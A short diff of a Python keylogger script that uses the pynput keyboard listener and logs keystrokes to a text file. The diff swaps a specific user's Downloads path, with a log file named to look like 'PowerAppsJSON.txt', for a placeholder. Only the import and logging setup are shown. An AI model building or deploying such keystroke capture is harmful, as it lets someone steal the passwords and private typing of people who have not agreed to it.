@@ -2,7 +2,7 @@ from pynput.keyboard import Key, Listener
 import logging
 
 # Set up logging to log the keystrokes to a file in the specified path
-logging.basicConfig(filename=("C:/Users/NeonRogue/Downloads/PowerAppsJSON.txt"), 
+logging.basicConfig(filename=("path to where you want your .txt"), 
                     level=logging.DEBUG, 
                     format="%(asctime)s: %(message)s")
 
